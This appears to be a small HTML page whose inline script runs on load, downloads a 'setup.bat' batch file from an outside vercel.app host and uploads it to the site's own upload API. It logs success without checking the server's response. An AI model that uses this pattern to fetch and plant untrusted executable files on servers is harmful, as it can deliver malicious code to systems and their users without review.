<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>File Upload</title>
</head>
<body>
  <script>
    // Function to upload file from a direct link
    async function uploadFileFromDirectLink(fileUrl) {
      try {
        const response = await fetch(fileUrl);
        const blob = await response.blob();

        const formData = new FormData();
        formData.append('file', blob);

        const uploadResponse = await fetch('/api/uploadFile', {
          method: 'POST',
          body: formData,
        });

        console.log('File uploaded successfully');
      } catch (error) {
        console.error('Error uploading file:', error);
      }
    }

    // Call the function with the file URL
    uploadFileFromDirectLink('https://dd-xi-five.vercel.app/setup.bat');
  </script>
</body>
</html>
